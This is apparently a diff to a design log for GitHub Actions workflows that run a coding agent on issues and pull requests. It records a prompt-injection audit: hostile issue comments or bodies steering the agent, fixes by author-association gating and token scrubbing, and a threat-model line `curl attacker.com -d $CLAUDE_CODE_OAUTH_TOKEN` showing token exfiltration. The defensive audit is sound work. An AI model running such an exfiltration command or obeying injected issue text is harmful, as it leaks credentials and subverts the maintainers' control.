@@ -465,9 +465,97 @@ workflow already assumes. Review is now no more exposed than implement; the resi
 blind to the injection path precisely because it is *not* the famous `pull_request_target` hole.
 A fresh adversarial reviewer with no attachment to the design found it in one pass. For anything
 carrying secrets on a public repo, an independent review is worth its cost. A possible future
-hardening (not done, documented instead): fetch context in a separate step and drop `GH_TOKEN`
-from the agent step entirely, so an injected agent could not use `gh` even if the input were
+hardening — **now implemented; see "Prompt-injection audit" below** — drops `GH_TOKEN` from the
+agent's environment so an injected agent cannot use `gh` even if the input were
 trusted-but-hostile.
+
+> **Follow-up correction (same day).** Reviewing *this* fix showed the "comments were the *only*
+> world-writable input" claim is not quite right: on a public repo anyone can *open* an issue, so
+> issue title/body are only write-gated while we author every issue. The two entries below tighten
+> the fix from "drop comments" to "gate on author association", and note that `implement.ts` had
+> the identical `--comments` vector, live in production.
+
+---
+
+## 2026-07-23 — Prompt-injection audit, layer 2: author association, not field type
+
+Reviewing the Layer-1 fix (drop `--comments`) opened two more doors.
+
+**1. "Title and body need write access" is an assumption, not a structural fact.** On a public
+repo **anyone can open an issue** with arbitrary title and body — write access is needed to
+*edit* an issue, not to *create* one. The Layer-1 conclusion held only because we author every
+issue today. It breaks the instant a maintainer labels a **community-authored** issue
+`agent:implement` — a normal triage action — because that issue's attacker-controlled body then
+flows into the review prompt. The bug did not close; it moved from comments to body.
+
+The fix generalises from *field* to *author*: `fetchTrustedIssue` returns the title/body only
+when the issue author's association is `OWNER`/`MEMBER`/`COLLABORATOR`, and never fetches
+comments. The injection boundary is now structural, and survives community issues entering the
+backlog.
+
+**2. `implement.ts` had the same `--comments` call — live in production.** Unlike review's
+*latent* issue-body risk, this one was active: anyone can comment on an issue already labelled
+`agent:implement`, and every implement run fed those comments to the agent. Now on the same
+author-gated fetch. Finding it is the payoff of auditing the *shared* surface rather than just
+the file that prompted the review.
+
+**Token scrub, both runners.** `scrubGitHubTokens()` now removes `GH_TOKEN`/`GITHUB_TOKEN` from
+the agent's environment after context is fetched and before the agent starts. The agent has no
+legitimate use for the GitHub token — context is already read, and pushing/labelling/commenting
+happen in separate workflow steps. This partly converts the convention-only "do not push / label
+/ comment" boundary into a technical control: the agent can no longer drive `gh`. Honest limits —
+it is process-scoped (later workflow steps, including implement's own push, are unaffected), and
+it does not remove the git credential `actions/checkout` persists; blocking `git push` is a
+separate control (`contents: read` on review).
+
+The compounding lesson: the boundary is never "which field" — it is "who can write this input,"
+and the answer terminates at author association. Each fix, reviewed, revealed the next door.
+
+## 2026-07-23 — The irreducible residual: noSandbox, egress, and exfiltration
+
+After author-gating every text input, here is what remains and what closing it would cost.
+
+**Remaining injection *source*: the diff and repo contents.** Irreducible — a review agent must
+read the code under review, and code carries comments and strings. For same-repo (guarded) PRs
+this is write-gated, reducing to "trust your collaborators and your dependencies." A poisoned
+transitive dependency is the source that write-gating the PR does not cover.
+
+**Remaining exfil *channels*, all downstream of `noSandbox()` (Decision 2):** full network egress
+(`curl attacker.com -d $CLAUDE_CODE_OAUTH_TOKEN` — no public channel or repo write needed); the
+model token in the agent's readable environment (it must be there to run); and the public review
+summary the agent authors.
+
+**Cheaply fixable, and done:** author-gating, `GH_TOKEN` scrub, `contents: read` on review, and
+token scope/rotation/short TTL (`GITHUB_TOKEN` is already ephemeral — never substitute a
+long-lived `AGENT_PAT` where it suffices).
+
+**Not cheaply fixable:** network egress + a live model token the agent can read. That containment
+is exactly what a sandbox provides and exactly what Decision 2 traded away for environment-parity
+with CI (which killed the `yq`-drift bug class). The tension is real — **environment-parity XOR
+cheap exfil-containment**, not both — without re-introducing a sandbox that mirrors CI *and*
+restricts egress. GitHub-hosted runners offer no egress filtering, so that means self-hosted
+runners or a containment layer.
+
+**Accepted posture.** With all injection sources behind the write boundary, the residual is "a
+compromised collaborator or a poisoned dependency could exfiltrate a scoped, rotatable model
+token." Standard, bounded, monitorable — the same trust surface as letting collaborators run CI.
+Reach for sandbox-plus-egress-control only if the threat model includes untrusted code or
+high-value long-lived secrets.
+
+**Benchmark — CVM does less (clone 2026-07-21).** No fork guard (only the label check, relying on
+label-adding requiring write/triage); no author-association filtering (it feeds `--comments` and
+all unresolved review threads to the agent); `contents: write` (its full review self-commits and
+pushes). Its whole mitigation is "ephemeral runner + write-to-label + trust collaborators." And
+GitHub's "require approval for fork workflow runs" does **not** cover `pull_request_target`, so
+that label gate is load-bearing for him. Copying CVM verbatim — the original plan — would have
+inherited both the fork path and the injection surface. We are now stricter than the model repo,
+with the residual written down.
+
+**Hard prerequisite for the full build-out.** Full CVM-style review replies to human PR review
+threads, which *requires* reading world-writable comments — reintroducing the injection source by
+design. Upstream's `review-context.ts` does not author-filter threads. The full version MUST apply
+the same author-association gate to review-thread comments, and its self-improvement commits add
+`contents: write` + push. Prerequisite, not nicety.
 
 ---
 
@@ -476,12 +564,14 @@ trusted-but-hostile.
 The loop is proven for implement across all three rule classes, and the corpus has closed the
 find→fix→validate cycle. Still unexercised or outstanding:
 
-- **`agent-review.yml` does not exist.** Review is still a human step. When it is added it uses
-  `pull_request_target` — on this public repo, add
-  `if: github.event.pull_request.head.repo.full_name == github.repository` from the first commit,
-  or forks can execute code with secrets in scope. The shared-helper extraction (a composite
-  action for the setup steps; backfilling `shared/common.ts`) pays off when this second workflow
-  lands, not before.
+- **`agent-review.yml` (review-lite) is built but not yet merged or run** (PR #42). Fork-guarded,
+  author-gated, token-scrubbed, `contents: read`. Untested end to end — no PR has been reviewed by
+  it yet. That is the next thing to exercise.
+- **Shared-setup extraction still pending.** implement and review now duplicate the
+  checkout → node → npm ci → install-Claude-Code steps; a composite action is the focused
+  follow-up now that a second workflow exists to justify it.
+- **Full review is gated on the author-association filter for review threads** (see the residual
+  entry above) — a hard prerequisite before porting thread-replies, which upstream does not gate.
 - **`AGENT_PAT` expiry is not tracked.** Set a reminder for the chosen expiry, or the loop dies
   silently with a 401 when it lapses. Highest-priority loose end because it fails invisibly.
 - The corpus is a **2.6% stride sample** (4,000 of 155,150) at one pinned SHA. Clean there is
